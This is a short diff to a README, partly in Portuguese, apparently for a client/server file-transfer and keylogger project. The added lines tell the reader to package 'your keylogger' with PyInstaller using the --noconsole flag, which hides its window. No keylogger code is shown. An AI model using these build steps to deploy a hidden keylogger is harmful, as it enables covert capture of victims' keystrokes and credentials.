@@ -16,4 +16,10 @@ CONFIGURE-OS PARA FAZER A CONEXÃO;
 ENVIADA DO SERVIDOR COLOQUE O ARQUIVO OU PASTA DESEJADA NA MESMA PASTA ONDE
 O ARQUIVO('server.py') ESTÁ SENDO EXECUTADO.
 
+To make your keylogger run you need install the pyinstaller 
+and run this comand in your console:
+
+
+pyinstaller --onefile --noconsole main.py
+
 creditos: Jhonnunes443
